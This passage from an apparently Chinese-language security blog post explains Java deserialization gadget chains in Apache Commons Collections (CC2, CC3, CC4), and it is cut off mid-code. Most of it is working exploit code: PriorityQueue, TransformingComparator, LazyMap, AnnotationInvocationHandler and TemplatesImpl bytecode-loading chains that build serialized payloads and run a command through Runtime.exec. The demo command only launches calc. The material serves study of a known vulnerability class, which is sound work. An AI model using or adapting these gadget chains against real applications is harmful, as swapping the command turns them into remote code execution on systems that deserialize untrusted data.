class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] faketransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(faketransformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(transformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(priorityQueue);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;faketransformer是为了在构造过程中不执行命令，通过反射修改并序列化构造</p><h2 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons Collections3"></a>Commons Collections3</h2><p>cc3使用的依旧是org.apache.commons.collections.*与cc2不同</p><p>首先查看gadget</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/*<br> * Variation <span class="hljs-keyword">on</span> CommonsCollections1 <span class="hljs-keyword">that</span> uses InstantiateTransformer <span class="hljs-keyword">instead of</span><br> * InvokerTransformer.<br> */<br></code></pre></td></tr></table></figure><p>这里是说用InstantianteTransformer 代替 InvokerTransformer，那么我们去看这个类</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912091005964.png" class="" title="image-20220912091005964"><p>可以看到这里获取对应参数的constructor实例</p><p>cc3不在和cc1一样通过直接反射执行命令了，而是采用加载字节码的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templatesImpl &#125; )&#125;;<br></code></pre></td></tr></table></figure><p>这里就需要学习一个新类了</p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h4 id="Java加载类机制"><a href="#Java加载类机制" class="headerlink" title="Java加载类机制"></a>Java加载类机制</h4><p>ClassLoader#loadclass去类缓存、父类等位置寻找类（双亲委派机制），如果找不到则ClassLoader#findclass会去加载远程class(jar,http,本地文件)最后交给ClassLoader#defineclass去处理字节码</p><h4 id="TemplatesImpl利用"><a href="#TemplatesImpl利用" class="headerlink" title="TemplatesImpl利用"></a>TemplatesImpl利用</h4><p>阅读Templateslmpl源码可以看到内部定义了一个继承ClassLoader的子类</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912122422034.png" class="" title="image-20220912122422034"><p>且其defineClass传给ClassLoader处理</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912122629769.png" class="" title="image-20220912122629769"><p>由此，我们寻找调用该方法的调用链</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912122821377.png" class="" title="image-20220912122821377"><p>三处调用</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912123245789.png" class="" title="image-20220912123245789"><p>通过查看三处调用的被调用情况发现只有TemplatesImpl#getTransletInstance()被TemplatesImpl#newTransformer()调用</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912123539640.png" class="" title="image-20220912123539640"><p>调用链</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>查看调用条件_bytecodes是传入的字节码</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912125554927.png" class="" title="image-20220912125554927"><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912130005583.png" class="" title="image-20220912130005583"><p>_name!&#x3D;null _class&#x3D;&#x3D;null</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912151907050.png" class="" title="image-20220912151907050"><p>这里选择TransformerFactoryImpl，此外</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912152025725.png" class="" title="image-20220912152025725"><p>这里需要if成立进入否则进入else会报错</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912152134308.png" class="" title="image-20220912152134308"><p>也就是说传入字节码的类需要是上图类的子类</p><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cc3test1;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">sovo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">sovo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cc3test1;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc3run</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span>   <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;sovo&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(<span class="hljs-string">&quot;cc3test1.sovo&quot;</span>).toBytecode()&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912152235490.png" class="" title="image-20220912152235490"><p>接下来寻找能够调用newTransformer的类，回到源码，发现TrAXFilter.class</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220912163921782.png" class="" title="image-20220912163921782"><p>可以看到其构造方法调用了newTransformer</p><p>结合这两者我们编写代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cc3test1;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc3last</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;sovo&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(<span class="hljs-string">&quot;cc3test1.sovo&quot;</span>).toBytecode()&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(inner,transformer);<br><br><span class="hljs-comment">//        lazymap.get(&quot;sovo&quot;);</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,lazymap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxymap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);<br><span class="hljs-comment">//        proxymap.clear();</span><br>        invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class,proxymap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(invocationHandler);<br><br>        System.out.println(byteArrayOutputStream);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220913073530319.png" class="" title="image-20220913073530319">高版本java不能复现<h2 id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons Collections4"></a>Commons Collections4</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/*<br> * Variation <span class="hljs-keyword">on</span> CommonsCollections2 <span class="hljs-keyword">that</span> uses InstantiateTransformer <span class="hljs-keyword">instead of</span><br> * InvokerTransformer.<br> */<br></code></pre></td></tr></table></figure><p>归纳一下，cc3对于cc1的提升是使用了字节码，那么cc4对cc2的提升就是使用字节码</p><p>归纳cc3与cc1区别，并迁移cc2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;sovo&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(<span class="hljs-string">&quot;cc3test1.sovo&quot;</span>).toBytecode()&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(faketransformer);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span 